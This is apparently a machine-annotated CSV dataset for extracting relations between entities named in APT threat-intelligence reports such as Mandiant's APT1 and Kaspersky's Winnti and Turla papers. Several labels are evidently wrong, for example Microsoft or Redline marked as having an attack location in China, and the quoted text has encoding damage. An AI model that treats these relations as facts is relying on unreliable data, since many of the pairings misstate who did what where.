"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"RAP002_APT1_Technical_backstage.1.0","indicates","Terminator","WORK_OF_ART","two","CARDINAL","These two binaries allowed us to test the product and see how it works . 5.2 Password protection When the server is starting , a password is asked : Figure 7 : Terminator password "
"winnti-more-than-just-a-game-130410","hasattacklocation","C&C","ORG","Japan","GPE","Judging by the information that we have at our disposal . namely the tags within malicious programs , the names of the C&C domains , the companies whose digital certificates were stolen to sign malware , and the countries where detection notifications came from . we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China India Indonesia Japan "
"fireeye-poison-ivy-report","hasproduct","FireEye","ORG","PIVY","PRODUCT","The FireEye PIVY module for ChopShop decrypts Poison Ivy network traffic . "
"stuxnet_0_5_the_missing_link","hasattacklocation","Stuxnet C&C","ORG","Canada","GPE","The C&C server domains were created in 2005 and all displayed Internet advertising agency homepage for Stuxnet C&C servers the same front page purporting to be an Internet advertising agency named Media Suffix ( figure 1 ) with the tag line ¡ ° Believe What the Mind Can Dream¡±. The servers were hosted on commercial hosting providers in the United States , Canada , France , and Thailand . "
"Mandiant_APT1_Report","hasattacklocation","Redlineþ","ORG","China","GPE","While existing customers of Mandiant¡¯s enterprise - level products , Mandiant Managed Defense and Mandiant Intelligent Response . , have had prior access to these APT1 Indicators , we are also making them available for use with Redlineþ , our free host - based investigative tool . Redline can be downloaded at http://www.mandiant.com/ resources / download / redline . Conclusion The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified group based in China leaves little doubt about the organization behind APT1 . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","Travnet","ORG","China","GPE","The older WHOIS entry for the same domain was as follows : Conclusion of Travnet Analysis : From our analysis of the Travnet malware so far , it¡¯s quite evident that many things hint at the origin of this campaign to be from China . "
"hidden_lynx","hasattacklocation","Hidden Lynx","ORG","South Korea","GPE","The Hidden Lynx group has most recently conducted attacks against specific organizations in South Korea and has a long history of attacking the defense industrial sector of Western countries . "
"2013-9","hasattacklocation","Mandiant","ORG","China","GPE","The Mandiant report comments on the fact that there are limited English - fluent operators directly involved in the technical end of APT1 , which would significantly hinder progress.27 Considering these factors and the timeframe for growth presented above , it is conceivable that the information and strategy for its use would not be avail.able until 2009 . At this point , China could act to increase the output of the holdings that they currently owned . "
"2q-report-on-targeted-attack-campaigns","hasattacklocation","EvilGrab","ORG","Canada","GPE","Government organizations were , by far , the most affected by EvilGrab . This geolocation is based on the IP addresses of the victims . Therefore , foreign institutions within China would be identified as coming from China ; the same would hold true for all countries . EvilGrab was also found in the United States , Canada , France , Spain , and Australia , among others . "
"2013-9","hasattacklocation","Shady","PERSON","China","GPE","While this may cause issues to the Chinese in some logistical capacities , it would also serve to divert some of America¡¯s attention , making the situation a palatable outcome for China . Other actors An analysis of these events would be remiss without exploring any other possible attribution . Though unlikely , it is possible that there were other actors involved . As pointed out by Eugene Kaspersky in his criticism of the Shady RAT report , some of the tools and techniques are generic enough to not lend themselves to attribution to a particular entity . "
"winnti-more-than-just-a-game-130410","hasattacktime","Winnti","PERSON","2009","DATE","since 2009 . It¡¯s difficult to name all the victims of the Winnti team . "
"2013-9","hasattacktime","American","NORP","2010, Feb. 26","DATE","If Iran did in fact orches.trate the Shamoon attack , it would suggest that the series of attacks on Iranian critical infrastructure were followed by retaliation on the American oil supply chain . This would indicate an ongoing and escalating conflict that should be cause for concern . 51 Ibid 52 Rezvaniyeh , F. , ( 2010 , Feb. 26 ) "
"winnti-more-than-just-a-game-130410","hasattacklocation","Winnti","NORP","Japan","GPE","we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China India Indonesia Japan "
"crowdstrike-deep-panda-report","hasattacklocation","Microsoft","ORG","China","GPE","This tool is built in Microsoft .NET framework , which is typically an indication of a less sophis.ticated attacker , because .NET is easier to develop in but requires the .NET framework be present on the victim machine . The tool appears to have been compiled on Thursday May 26th , 2011 at 10:21:44 A.M. UTC ( early evening time in China ) . "
"2013-9","hasattacktime","billions of dollars","MONEY","2013, February 18","DATE","The article notes that ¡ ° when Venezuela seized billions of dollars in assets from Exxon Mo. 22 U.S. Energy Information Administration . ( 2013 , February 12 ) . International Energy Statistics [ Data file ] . Retrieved from http://www.eia.gov/cfapps/ipdbproject/iedindex3.cfm?tid=5&pid=53&aid=1&cid=CH,&syid=2006&eyid=2012&unit=TBPD 23 Kirk , J. ( 2011 , February 10 ) . ¡ ® Night dragon¡¯ attacks from china strike energy companies . Retrieved from http://www.networkworld.com/news/2011/021011-night-dragon-attacks-from-china.html 24 Mandiant . ( 2013 , February 18 ) . "
"2013-9","hasproduct","the Remote Access Trojan","ORG","¡°Mirage¡±","PRODUCT","Spear Phishing Countries with Companies Affected : U.S. Campaign : Mirage Publisher : Dell Se.cureWorks Synopsis : Dell SecureWorks gives a fairly good collection of technical details about the cam.paign they¡¯ve dubbed ¡ ° Mirage¡± for the string used to connect to the C2 server by the Remote Access Trojan , but largely they focused on studying the tool , not monitoring the APT activity . "
"Mandiant_APT1_Report","hasattacklocation","PLA","ORG","China","GPE","The PLA¡¯s cyber command is fully institutionalized within the CPC and able to draw upon the resources of China¡¯s state - owned enterprises to support its operations . The CPC is the ultimate authority in Mainland China ; unlike in Western societies , in which political parties are subordinate to the government , the military and government in China are subordinate to the CPC . "
"The_Epic_Turla_Operation","targets","Turla","PERSON","Epic","PRODUCT","There appears to be several links between Turla and Miniduke , but we will leave that for a future blogpost . Victim statistics On some of the C&C servers used in the Epic attacks , we were able to identify detailed victim statistics , which were saved for debugging purposes by the attackers . "
"2013-9","hasattacklocation","Byzantine Candor","ORG","China","GPE","58.246.0.0/15 112.64.0.0/15 139.226.0.0/15 114.80.0.0/20 101.80.0.0/20 Interestingly Night Dragon , which does not provide a range of IP addresses , offered instead that an individual operating out of Heze City , Shandong , China was responsible for providing the C2 servers through his company . An article published in the Wall Street Journal notes that McAfee identified this individual as ¡ ° Song Zhiyue.¡±3 Domains A full list of domains retrieved from the various reports can be found in the appendices . Of the domains which appeared in the reports , only matches between APT1 and Byzantine Candor were identified . "
